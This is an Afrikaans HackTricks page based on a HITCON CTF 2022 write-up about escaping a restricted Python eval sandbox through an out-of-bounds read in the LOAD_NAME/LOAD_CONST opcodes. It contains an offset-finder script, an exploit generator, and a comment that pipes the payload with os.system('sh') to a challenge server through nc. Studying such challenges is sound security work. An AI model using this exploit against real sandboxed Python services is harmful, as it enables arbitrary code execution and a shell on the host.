# LOAD_NAME / LOAD_CONST opcode OOB Lees

{% hint style="success" %}
Leer & oefen AWS Hack:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hack: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Controleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
{% endhint %}

**Hierdie inligting is geneem** [**uit hierdie skryfstuk**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

Ons kan die OOB leesfunksie in die LOAD_NAME / LOAD_CONST opcode gebruik om 'n simbool in die geheue te kry. Dit beteken dat ons 'n truuk soos `(a, b, c, ... honderde simbole ..., __getattribute__) if [] else [].__getattribute__(...)` kan gebruik om 'n simbool (soos 'n funksienaam) te kry wat jy wil hê.

Maak dan net jou aanval gereed.

### Oorsig <a href="#overview-1" id="overview-1"></a>

Die bronkode is redelik kort, bevat slegs 4 reëls!
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))1234
```
### Buitengrenslees <a href="#out-of-bound-read" id="out-of-bound-read"></a>

Hoe gebeur die segmenteringsfout?

Laten ons begin met 'n eenvoudige voorbeeld, `[a, b, c]` kan in die volgende bytekode kompileer word.
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE12345
```
Maar wat as die `co_names` 'n leë tuple word? Die `LOAD_NAME 2` opcode word steeds uitgevoer, en probeer om waarde van daardie geheue-adres te lees waar dit oorspronklik moes wees. Ja, dit is 'n out-of-bound read "kenmerk".

Die kernkonsep vir die oplossing is eenvoudig. Sommige opcodes in CPython byvoorbeeld `LOAD_NAME` en `LOAD_CONST` is kwesbaar (?) vir OOB lees.

Hulle haal 'n objek van indeks `oparg` van die `consts` of `names` tuple op (dit is wat `co_consts` en `co_names` onder die oppervlak genoem word). Ons kan na die volgende kort snipper oor `LOAD_CONST` verwys om te sien wat CPython doen wanneer dit na die `LOAD_CONST` opcode verwerk.
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}1234567
```
Op hierdie manier kan ons die OOB-funksie gebruik om 'n "naam" vanaf 'n arbitrêre geheueverskuiwing te kry. Om seker te maak watter naam dit het en wat die verskuiwing is, bly net probeer `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... En jy kan iets vind met ongeveer oparg > 700. Jy kan ook probeer om gdb te gebruik om natuurlik na die geheue-indeling te kyk, maar ek dink nie dit sal makliker wees nie?

### Die Exploit Genereer <a href="#generating-the-exploit" id="generating-the-exploit"></a>

Sodra ons daardie nuttige verskuiwings vir name / konstantes terugkry, hoe _kry_ ons 'n naam / konstante van daardie verskuiwing en gebruik dit? Hier is 'n truuk vir jou:\
Laat ons aanneem ons kan 'n `__getattribute__`-naam vanaf verskuiwing 5 (`LOAD_NAME 5`) met `co_names=()` kry, doen dan net die volgende dinge:
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]1234
```
> Merk op dat dit nie nodig is om dit as `__getattribute__` te noem nie, jy kan dit noem as iets korter of vreemder

Jy kan die rede daaragter verstaan deur net na sy bytekode te kyk:
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE1234567891011121314
```
Merk op dat `LOAD_ATTR` ook die naam uit `co_names` ophaal. Python laai name vanaf dieselfde offset as die naam dieselfde is, so die tweede `__getattribute__` word steeds gelaai vanaf offset=5. Deur hierdie kenmerk te gebruik, kan ons 'n arbitrêre naam gebruik sodra die naam in die geheue naby is.

Vir die genereer van getalle behoort dit triviaal te wees:

* 0: not \[\[]]
* 1: not \[]
* 2: (not \[]) + (not \[])
* ...

### Uitbuitingskrips <a href="#exploit-script-1" id="exploit-script-1"></a>

Ek het nie konstantes gebruik as gevolg van die lengtebeperking nie.

Eerstens hier is 'n skrips vir ons om daardie offsets van name te vind.
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
```
En die volgende is vir die skep van die werklike Python uitbuit.
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
Dit doen basies die volgende dinge, vir daardie strings wat ons kry van die `__dir__` metode:
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
{% hint style="success" %}
Leer & oefen AWS-hacking: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP-hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kontroleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
{% endhint %}
